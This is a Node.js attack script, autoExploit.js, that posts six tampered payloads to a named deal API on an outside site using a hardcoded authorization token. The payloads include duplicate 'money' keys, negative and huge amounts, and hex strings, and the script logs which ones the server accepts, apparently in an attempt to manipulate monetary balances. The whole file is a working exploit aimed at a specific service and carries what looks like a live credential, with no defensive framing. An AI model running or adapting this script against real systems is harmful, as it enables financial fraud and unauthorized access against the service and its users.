const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import fs from "fs";

const endpoint = 'https://fnn02.vip/api_deal/load/create';
const authHeader = 'TERc/9260xgILO4HuXsdtru5hUy4NZjhpkzd/DhE6dFVY5F/OeFmjKcyxdgfTmEri7QVcxVVCuCp9Gg95K1nIlSKv4Rl3pyHzkJR0ji1yw2Nqzp0srkvQoGkRHPBb8ydi99aFnkR00PeDAqHjmTAHY2mdp9pgnfKrAo3Aa7BwIU='

const resultsFile = 'exploit_results.json';

const successIndicators = [
  'success',
  'submitted',
  'accepted',
  'ok',
  'done'
];

const isSuccess = (json) => {
  if (!json || typeof json !== 'object') return false;
  return Object.values(json).some(v =>
    typeof v === 'string' && successIndicators.some(k => v.toLowerCase().includes(k))
  );
};

const log = (strategy, payload, response, success) => {
  const entry = {
    strategy,
    payload,
    response,
    success,
    timestamp: new Date().toISOString()
  };
  fs.appendFileSync(resultsFile, JSON.stringify(entry, null, 2) + ',\n');
};

const send = async ({ strategy, body, raw = false }) => {
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: raw ? body : JSON.stringify(body)
    });

    const type = res.headers.get('content-type');
    const text = await res.text();
    let json = null;

    if (type && type.includes('application/json')) {
      json = JSON.parse(text);
    }

    const success = isSuccess(json);
    console.log(`🧨 ${strategy}:`, success ? '✅ SUCCESS' : '❌ Failed');
    log(strategy, raw ? body : JSON.parse(JSON.stringify(body)), json || text, success);
  } catch (err) {
    console.error(`💥 ${strategy} threw error:`, err.message);
    log(strategy, body, err.message, false);
  }
};

(async () => {
  console.log('🚀 Running autoExploit.js');

  // 1. Duplicate key injection
  await send({
    strategy: 'exploit-duplicate-money',
    raw: '{"deal_id":7,"money":100,"money":-9999}'
  });

  // 2. Query vs body override
  await send({
    strategy: 'exploit-query-vs-body',
    body: { deal_id: 7, money: -9999 },
    url: endpoint + '?money=100'
  });

  // 3. Hex injection
  await send({
    strategy: 'exploit-hex-override',
    body: { deal_id: 7, money: "0x64" }
  });

  // 4. Large pledge (possible overflow or acceptance)
  await send({
    strategy: 'exploit-large-pledge',
    body: { deal_id: 7, money: 999999999 }
  });

  // 5. Stringified numeric keys
  await send({
    strategy: 'exploit-string-numbers',
    body: { deal_id: "7", money: "-100" }
  });

  // 6. No deal_id test
  await send({
    strategy: 'exploit-missing-deal',
    body: { money: -100 }
  });

  console.log('✅ autoExploit complete. See exploit_results.json');
})();
